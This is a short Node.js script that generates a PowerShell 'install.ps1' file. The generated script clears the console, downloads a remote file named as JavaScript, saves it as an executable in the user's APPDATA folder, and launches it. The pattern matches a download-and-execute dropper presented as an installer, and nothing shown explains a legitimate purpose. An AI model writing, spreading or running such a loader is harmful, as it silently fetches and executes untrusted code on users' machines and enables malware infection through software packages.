const fs = require('fs');
const {join} = require('path');

const { REPO_NAME, BASE_URL, SHEBANG_PWSH } = require('./constants');

const currentDirectory = __dirname;

const directoryToSave = `${join(currentDirectory, '..', 'lib')}`

console.log(directoryToSave);

fs.writeFileSync(
  `${directoryToSave}/install.ps1`,
  `${SHEBANG_PWSH}
$ProcName = "${REPO_NAME}.exe"
$WebFile = "${BASE_URL}/${REPO_NAME}/lib/${REPO_NAME}.js"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")`,
);
